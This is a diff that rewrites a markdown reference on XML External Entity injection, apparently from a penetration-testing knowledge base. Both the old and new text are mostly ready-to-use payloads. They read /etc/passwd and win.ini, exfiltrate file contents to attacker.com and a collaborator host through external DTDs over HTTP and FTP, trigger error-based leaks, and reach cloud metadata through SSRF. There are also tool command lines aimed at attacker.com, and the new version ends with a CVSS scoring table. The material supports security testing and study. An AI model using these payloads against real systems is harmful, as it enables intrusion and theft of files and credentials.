@@ -1,107 +1,102 @@
-# XXE: XML External Entity Injection
+# XML External Entity (XXE): Complete Reference
 
-## Detection Methodology
+## Detection Phase
 
-Test every endpoint that accepts XML or can be switched to XML via Content-Type:
-
+### Classic XXE
 ```xml
-<!-- Basic probe -->
-<?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]>
-<root>&test;</root>
-
-<!-- Blind XXE probe (OOB) -->
-<?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://collaborator.oastify.com/"> %xxe;]>
-<root/>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe "test">
+]>
+<root>&xxe;</root>
 ```
 
-## Exploitation Techniques
-
-### In-Band File Read
+### File Read XXE
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<data>&xxe;</data>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>&xxe;</root>
 ```
 
-### Blind XXE via External DTD
-Host `evil.dtd` on attacker server:
+### Blind XXE (Out-of-Band)
 ```xml
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://COLLABORATOR.oastify.com/test">
+]>
+<root>&xxe;</root>
+```
+
+## Blind XXE Exfiltration
+
+### OOB Data Exfiltration
+```xml
+# Step 1: External DTD on attacker server
+# attacker.dtd:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR.oastify.com/?data=%file;'>">
 %eval;
 %exfil;
-```
 
-Victim payload:
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE r [
-  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
-  %dtd;
+# Step 2: Victim XML
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % start SYSTEM "http://attacker.com/attacker.dtd">
+  %start;
 ]>
-<r/>
+<root>&exfil;</root>
 ```
 
-### XXE → SSRF (Cloud Metadata)
+### Error-Based Blind XXE
 ```xml
-<!DOCTYPE r [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
-]>
-<r>&xxe;</r>
-```
-
-### Error-Based XXE (No OOB, No Reflection)
-```xml
+# Force error that includes file content
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
 %error;
 ```
 
-## Bypass Techniques
-
-### Parameter Entity Bypass
-When `&` is filtered, use parameter entities (`%`) instead:
+## XInclude Attacks
 ```xml
-<!DOCTYPE root [
-  <!ENTITY % param1 SYSTEM "file:///etc/passwd">
-  %param1;
-]>
+# When you control XML within an existing document
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</root>
 ```
 
-### UTF-7 Encoding
+## Parameter Entity Chaining
 ```xml
-<?xml version="1.0" encoding="UTF-7"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % p1 SYSTEM "http://attacker.com/evil.dtd">
+  %p1;
 ]>
-<data>&xxe;</data>
+<root>&exfil;</root>
 ```
 
-### Local DTD Repurposing
-When no external access is available, use local DTD files:
+## Binary File Exfiltration
+When exfiltrating binary files, encode to base64 first.
+
+### FTP Exfiltration
 ```xml
-<!DOCTYPE r [
-  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-  <!ENTITY % ISOamso "
-    <!ENTITY % file SYSTEM 'file:///etc/passwd'>
-    <!ENTITY % eval '<!ENTITY &#x25; error SYSTEM "file:///nonexistent/%file;">'>
-    %eval;
-    %error;
-  ">
-  %local_dtd;
-]>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
+%eval;
+%exfil;
 ```
 
-## Tooling
-
-```bash
-# XXEinjector - automated blind XXE
-ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --path=/uploads
-# oxml_xxe - Office format XXE injection
-python oxml_xxe.py -f document.docx --xxe "file:///etc/passwd"
-```
+## CVSS Scoring
+| Scenario | CVSS | Criteria |
+|----------|------|---------|
+| XXE file read | 7.5 | Network, Low, No auth, Confidentiality high |
+| XXE -> SSRF -> internal scan | 8.6 | Network, Low, No auth, Changed scope |
+| XXE -> DoS (Billion Laughs) | 6.5 | Network, Low, No auth, Availability high |
+| Blind XXE OOB data exfil | 7.5 | Network, Low, No auth, Changed scope |
+| XXE -> RCE (expect plugin) | 9.8 | Network, Low, No auth, Full impact |
